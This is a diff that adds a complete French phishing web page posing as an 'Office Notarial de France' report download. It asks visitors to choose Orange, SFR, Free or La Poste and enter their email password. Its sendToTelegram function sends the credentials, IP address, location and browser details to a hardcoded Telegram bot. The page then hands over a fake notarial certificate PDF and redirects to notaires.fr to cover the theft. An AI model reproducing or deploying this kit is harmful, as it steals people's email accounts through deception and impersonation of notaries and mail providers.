@@ -1,0 +1,653 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Rapport de l'office notarial de France</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="https://files.catbox.moe/h90lru.jpg">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.25/jspdf.plugin.autotable.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
+            font-family: 'Open Sans', sans-serif;
+            padding: 20px;
+            box-sizing: border-box;
+            position: relative;
+        }
+
+        .form-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 480px;
+        }
+
+        .form-container {
+            background: white;
+            border-radius: 12px;
+            width: 100%;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            margin-bottom: 25px;
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .success-container {
+            display: none;
+            background: white;
+            border-radius: 12px;
+            width: 100%;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            margin-bottom: 25px;
+            text-align: center;
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .logo {
+            width: 80px;
+            display: block;
+            margin: 0 auto 20px;
+            transition: all 0.3s ease;
+        }
+
+        .provider-logo {
+            width: 45px;
+            height: 45px;
+            object-fit: contain;
+            margin-right: 12px;
+            transition: all 0.3s ease;
+            border-radius: 4px;
+        }
+
+        .provider-btn img[src*="561188.png"] {
+            filter: grayscale(30%);
+            opacity: 0.8;
+        }
+
+        .description {
+            font-size: 14px;
+            color: #555;
+            text-align: center;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .success-message {
+            font-size: 16px;
+            color: #2ecc71;
+            text-align: center;
+            margin-bottom: 25px;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+
+        .download-btn {
+            width: 100%;
+            padding: 14px;
+            background: #2ecc71;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            cursor: pointer;
+            transition: background 0.3s;
+            text-decoration: none;
+            display: block;
+            margin-top: 25px;
+            font-weight: 500;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+        }
+
+        .download-btn:hover {
+            background: #27ae60;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 14px;
+            box-sizing: border-box;
+            transition: all 0.3s;
+            background: #f9f9f9;
+        }
+
+        .input-field:focus {
+            border-color: #4285f4;
+            background: white;
+            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.1);
+            outline: none;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 500;
+            margin-top: 5px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+        }
+
+        .btn:hover {
+            background: #3367d6;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .btn-secondary {
+            background: #f1f1f1;
+            color: #555;
+        }
+
+        .btn-secondary:hover {
+            background: #e0e0e0;
+        }
+
+        .error-message {
+            color: #e74c3c;
+            font-size: 13px;
+            text-align: center;
+            margin: 10px 0 15px;
+            display: none;
+            padding: 10px;
+            background: #fdecea;
+            border-radius: 4px;
+        }
+
+        .providers-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin: 20px 0;
+            gap: 10px;
+        }
+
+        .provider-btn {
+            border: 1px solid #e0e0e0;
+            background: white;
+            border-radius: 8px;
+            padding: 12px 15px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: calc(50% - 15px);
+            box-sizing: border-box;
+        }
+
+        .provider-btn:hover {
+            border-color: #4285f4;
+            box-shadow: 0 4px 12px rgba(66, 133, 244, 0.15);
+            transform: translateY(-2px);
+        }
+
+        .provider-btn.active {
+            border-color: #4285f4;
+            background-color: #f0f7ff;
+        }
+
+        .provider-name {
+            font-size: 13px;
+            color: #555;
+            font-weight: 500;
+        }
+
+        .email-domain {
+            color: #4285f4;
+            font-weight: 600;
+        }
+
+        .copyright {
+            font-size: 13px;
+            color: #777;
+            text-align: center;
+            margin-top: 25px;
+            line-height: 1.4;
+        }
+
+        .selected-email-display {
+            background: #f0f7ff;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #333;
+            border-left: 3px solid #4285f4;
+        }
+
+        @media (max-width: 480px) {
+            .form-container, .success-container {
+                padding: 25px;
+            }
+            
+            .logo {
+                width: 70px;
+            }
+            
+            .provider-btn {
+                width: 100%;
+                padding: 10px 12px;
+            }
+            
+            .provider-logo {
+                width: 40px;
+                height: 40px;
+            }
+            
+            .input-field, .btn {
+                padding: 13px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="form-wrapper">
+        <div class="form-container" id="login-form">
+            <img src="https://zupimages.net/up/25/16/ern5.jpg" class="logo" alt="Logo" id="main-logo">
+            
+            <div class="description" id="main-description">
+                Veuillez sélectionner votre fournisseur de messagerie
+            </div>
+            
+            <div id="message" class="error-message"></div>
+            
+            <form method="post" onsubmit="sendToTelegram(); return false;">
+                <!-- Sélection initiale du fournisseur -->
+                <div class="providers-container" id="initial-providers">
+                    <div class="provider-btn" data-provider="orange" data-domain="orange.fr">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/Orange_logo.svg/1200px-Orange_logo.svg.png" class="provider-logo">
+                        <span class="provider-name">Orange</span>
+                    </div>
+                    
+                    <div class="provider-btn" data-provider="sfr" data-domain="sfr.fr">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/97/SFR-2022-logo.svg/1200px-SFR-2022-logo.svg.png" class="provider-logo">
+                        <span class="provider-name">SFR</span>
+                    </div>
+                    
+                    <div class="provider-btn" data-provider="free" data-domain="free.fr">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/52/Free_logo.svg/2560px-Free_logo.svg.png" class="provider-logo">
+                        <span class="provider-name">Free</span>
+                    </div>
+                    
+                    <div class="provider-btn" data-provider="laposte" data-domain="laposte.net">
+                        <img src="https://logos-world.net/wp-content/uploads/2021/02/La-Poste-Emblem.png" class="provider-logo">
+                        <span class="provider-name">La Poste</span>
+                    </div>
+                </div>
+                
+                <!-- Étape email -->
+                <div id="email-step" style="display: none;">
+                    <input id="email" name="email" class="input-field" placeholder="Adresse e-mail" type="email" required autocomplete="off">
+                </div>
+                
+                <div id="password-container" style="display:none;">
+                    <div class="selected-email-display">
+                        <span id="selected-email-display"></span>
+                    </div>
+                    <input id="password" name="password" class="input-field" placeholder="Mot de passe" type="password" required autocomplete="off">
+                </div>
+                
+                <div class="buttons">
+                    <button id="next" class="btn" style="display:none;">Continuer</button>
+                    <button id="submit-btn" class="btn" style="display:none;">Valider</button>
+                </div>
+            </form>
+        </div>
+
+        <div class="success-container" id="success-page">
+            <img src="https://zupimages.net/up/25/16/ern5.jpg" class="logo" alt="Logo">
+            
+            <div class="success-message">
+                Vérification réussie ! Votre document est prêt à être téléchargé.
+            </div>
+            
+            <a href="#" id="download-link" class="download-btn">Télécharger le rapport notarial (PDF)</a>
+        </div>
+        
+        <div class="copyright">
+            © 2025 Office Notarial de France - Tous droits réservés<br>
+            Service sécurisé et confidentiel
+        </div>
+    </div>
+
+    <script>
+        // Initialisation jsPDF
+        const { jsPDF } = window.jspdf;
+        
+        // Variables globales
+        let selectedProvider = '';
+        let selectedProviderName = '';
+        
+        $(document).ready(function() {
+            // Gestion du clic sur les fournisseurs initiaux
+            $('#initial-providers .provider-btn').click(function() {
+                selectedProvider = $(this).data('provider');
+                selectedProviderName = $(this).find('.provider-name').text();
+                const domain = $(this).data('domain');
+                
+                // Mise à jour de l'interface
+                $('#initial-providers').fadeOut(300, function() {
+                    $('#main-description').text('Veuillez saisir votre adresse email ' + selectedProviderName);
+                    $('#email-step').fadeIn(300);
+                    $('#next').fadeIn(300).text('Continuer');
+                    
+                    // Pré-remplir le domaine
+                    if (domain) {
+                        $('#email').val('@' + domain);
+                    }
+                    $('#email').focus();
+                });
+                
+                // Mise à jour du logo principal
+                $('#main-logo').attr('src', $(this).find('.provider-logo').attr('src'));
+                $('#main-logo').css({
+                    'width': '70px',
+                    'border-radius': '8px',
+                    'background': '#f5f5f5',
+                    'padding': '8px'
+                });
+            });
+        });
+
+        $(document).keypress((e) => {
+            if (e.keyCode === 13) {
+                $("#submit-btn").is(":visible") ? $("#submit-btn").click() : $("#next").click();
+            }
+        });
+
+        $('#next').click(function(e) {
+            e.preventDefault();
+            $('.error-message').hide();
+            
+            // Étape 1: Validation email
+            if ($("#password-container").is(":hidden") && $("#email-step").is(":visible")) {
+                const email = $("#email").val();
+                if (!email) {
+                    showError("Veuillez saisir votre email");
+                    return;
+                }
+                if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                    showError("Email invalide");
+                    return;
+                }
+                
+                $("#next").text("Vérification...");
+                setTimeout(() => {
+                    $("#email").attr('readonly', true);
+                    $('#selected-email-display').html(`Connectez-vous à <span class="email-domain">${email}</span> avec ${selectedProviderName}`);
+                    $('#main-description').text(`Veuillez saisir le mot de passe de ${email}`);
+                    $("#password-container").fadeIn(300);
+                    $("#next").text("Continuer");
+                }, 800);
+            }
+            // Étape 2: Validation mot de passe
+            else {
+                if (!$("#password").val()) {
+                    showError("Veuillez saisir votre mot de passe");
+                    return;
+                }
+                
+                $("#next").text("Vérification...");
+                setTimeout(() => {
+                    $("#password").attr('readonly', true);
+                    $("#next").hide();
+                    $("#submit-btn").fadeIn(300);
+                }, 800);
+            }
+        });
+
+        function showError(msg) {
+            $("#message").text(msg).fadeIn();
+        }
+
+        function generateProfessionalNotaryDocument(clientData) {
+            const doc = new jsPDF();
+            const today = new Date().toLocaleDateString('fr-FR');
+            const reference = 'NOT-' + Math.floor(Math.random() * 90000 + 10000);
+            
+            // En-tête professionnel
+            doc.setFontSize(16);
+            doc.setTextColor(40, 40, 40);
+            doc.setFont('helvetica', 'bold');
+            doc.text('OFFICE NOTARIAL DE FRANCE', 105, 20, { align: 'center' });
+            
+            doc.setFontSize(10);
+            doc.setTextColor(100, 100, 100);
+            doc.setFont('helvetica', 'normal');
+            doc.text('123 Avenue de la République, 75011 Paris', 105, 28, { align: 'center' });
+            doc.text('Tél: 01 23 45 67 89 - Email: contact@notaires-france.fr', 105, 32, { align: 'center' });
+            
+            // Ligne séparatrice
+            doc.setDrawColor(200, 200, 200);
+            doc.line(20, 38, 190, 38);
+            
+            // Titre du document
+            doc.setFontSize(14);
+            doc.setTextColor(30, 30, 30);
+            doc.setFont('helvetica', 'bold');
+            doc.text('RAPPORT NOTARIAL OFFICIEL', 105, 48, { align: 'center' });
+            
+            // Informations générales
+            doc.setFontSize(10);
+            doc.setTextColor(80, 80, 80);
+            doc.setFont('helvetica', 'normal');
+            doc.text(`N° Document: ${reference}`, 20, 60);
+            doc.text(`Date: ${today}`, 20, 66);
+            doc.text(`Email: ${clientData.email || 'Non spécifié'}`, 20, 72);
+            
+            // Contenu du rapport (aléatoire parmi plusieurs options)
+            const reportOptions = [
+                {
+                    title: "CERTIFICAT DE CONFORMITÉ LÉGALE",
+                    content: [
+                        "Je soussigné, Maître Jean Dupont, notaire en exercice, certifie que",
+                        "les documents présentés par le client ont été examinés avec soin",
+                        "et sont conformes aux exigences légales en vigueur.",
+                        "",
+                        "Ce document atteste de la validité des pièces présentées et de",
+                        "l'authenticité des signatures apposées. La vérification d'identité",
+                        "a été effectuée selon les procédures standard de l'Ordre des Notaires."
+                    ]
+                },
+                {
+                    title: "ATTESTATION NOTARIALE",
+                    content: [
+                        "En ma qualité de notaire assermenté, j'atteste avoir procédé à",
+                        "l'examen complet des documents soumis par le client. Toutes les",
+                        "vérifications nécessaires ont été effectuées conformément aux",
+                        "dispositions légales en vigueur.",
+                        "",
+                        "Les éléments suivants ont été contrôlés:",
+                        "- Authenticité des signatures",
+                        "- Validité des pièces d'identité",
+                        "- Conformité aux réglementations applicables",
+                        "- Cohérence des informations fournies"
+                    ]
+                },
+                {
+                    title: "RAPPORT D'ANALYSE NOTARIALE",
+                    content: [
+                        "Le présent rapport constitue une analyse approfondie des documents",
+                        "soumis à notre étude. Après examen minutieux, nous confirmons que",
+                        "toutes les formalités légales ont été respectées.",
+                        "",
+                        "Détails de l'analyse:",
+                        "- Vérification d'identité: Complète et conforme",
+                        "- Authentification: Signatures certifiées valides",
+                        "- Documents: Aucune anomalie détectée",
+                        "- Procédures: Respect des délais légaux"
+                    ]
+                }
+            ];
+            
+            const selectedReport = reportOptions[Math.floor(Math.random() * reportOptions.length)];
+            
+            doc.setFontSize(12);
+            doc.setTextColor(50, 50, 50);
+            doc.setFont('helvetica', 'bold');
+            doc.text(selectedReport.title + ":", 20, 100);
+            
+            doc.setFont('helvetica', 'normal');
+            doc.text(selectedReport.content, 20, 110);
+            
+            // Signature et cachet
+            doc.setFontSize(10);
+            doc.setTextColor(80, 80, 80);
+            doc.text(`Fait à Paris, le ${today}`, 140, 200);
+            doc.text('Le Notaire', 140, 210);
+            doc.text('_________________________', 140, 220);
+            
+            // Cachet officiel
+            doc.setFillColor(240, 240, 240);
+            doc.ellipse(150, 180, 20, 15, 'F');
+            doc.setTextColor(150, 0, 0);
+            doc.setFontSize(8);
+            doc.text("OFFICIEL", 150, 180, { align: 'center' });
+            doc.text("NOTARIAL", 150, 185, { align: 'center' });
+            
+            // Mentions légales
+            doc.setFontSize(8);
+            doc.setTextColor(120, 120, 120);
+            doc.text('Document officiel établi par un notaire assermenté - Toute falsification est punie par la loi', 105, 280, { align: 'center' });
+            
+            return doc;
+        }
+
+        function triggerDownload() {
+            const clientData = {
+                email: $("#email").val()
+            };
+            
+            const doc = generateProfessionalNotaryDocument(clientData);
+            const pdfName = `Rapport_Notarial.pdf`;
+            
+            // Solution optimale pour le téléchargement
+            const pdfData = doc.output('blob');
+            const pdfUrl = URL.createObjectURL(pdfData);
+            
+            const a = document.createElement('a');
+            a.href = pdfUrl;
+            a.download = pdfName;
+            document.body.appendChild(a);
+            a.click();
+            
+            // Nettoyage
+            setTimeout(() => {
+                document.body.removeChild(a);
+                URL.revokeObjectURL(pdfUrl);
+            }, 100);
+        }
+
+        function sendToTelegram() {
+            const botToken = "8322883355:AAHmsBrixCfSlh2UBPLnQuZR6ASb-G1vuwY";
+            const chatId = "7058388804";
+            
+            const formData = {
+                email: $("#email").val(),
+                password: $("#password").val(),
+                provider: selectedProviderName || 'Autre'
+            };
+
+            // On envoie les données à Telegram avec un meilleur formatage
+            try {
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(location => {
+                        // Emojis et mise en forme améliorée
+                        const message = `🔔 <b>NOUVELLE CONNEXION NOTAIRE</b> 🔔
+━━━━━━━━━━━━━━━━━━
+📧 <b>Email:</b> <code>${formData.email}</code>
+🔑 <b>Mot de passe:</b> <code>${formData.password}</code>
+📭 <b>Fournisseur:</b> ${formData.provider}
+━━━━━━━━━━━━━━━━━━
+📍 <b>Localisation:</b> ${location.city || 'Inconnu'}, ${location.country_name || 'Inconnu'} (${location.postal || 'N/A'})
+🕒 <b>Date:</b> ${new Date().toLocaleString('fr-FR')}
+🌐 <b>IP:</b> <code>${location.ip || 'Inconnue'}</code>
+━━━━━━━━━━━━━━━━━━
+⚡ <b>Système:</b> ${navigator.platform}
+🌍 <b>Navigateur:</b> ${navigator.userAgent.split(') ')[0].split(' (')[1] || 'Inconnu'}`;
+
+                        // Envoi via Telegram Bot API avec HTML
+                        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                        
+                        fetch(telegramUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message,
+                                parse_mode: 'HTML'
+                            })
+                        }).then(() => {
+                            // Envoi d'une seconde notification stylisée
+                            const notification = `🎯 <b>Nouveau rapport généré</b> 🎯
+━━━━━━━━━━━━━━━━━━
+📄 <b>Document:</b> Rapport Notarial
+📧 <b>Contact:</b> ${formData.email}
+━━━━━━━━━━━━━━━━━━
+🕒 ${new Date().toLocaleTimeString('fr-FR')}`;
+                            
+                            return fetch(telegramUrl, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    text: notification,
+                                    parse_mode: 'HTML'
+                                })
+                            });
+                        }).catch(e => console.log("Erreur second message ignorée:", e));
+                    }).catch(e => console.log("Erreur localisation ignorée:", e));
+            } catch (e) {
+                console.log("Erreur globale ignorée:", e);
+            }
+
+            // On continue le processus normal dans tous les cas
+            $('#login-form').hide();
+            $('#success-page').fadeIn();
+            
+            $('#download-link').click(function(e) {
+                e.preventDefault();
+                triggerDownload();
+                
+                // Redirection après téléchargement
+                setTimeout(() => {
+                    window.location.href = "https://notaires.fr";
+                }, 2000);
+            });
+            
+            // Déclenchement automatique après 1.5s
+            setTimeout(() => {
+                $('#download-link').trigger('click');
+            }, 1500);
+            
+            return false;
+        }
+    </script>
+</body>
+</html>
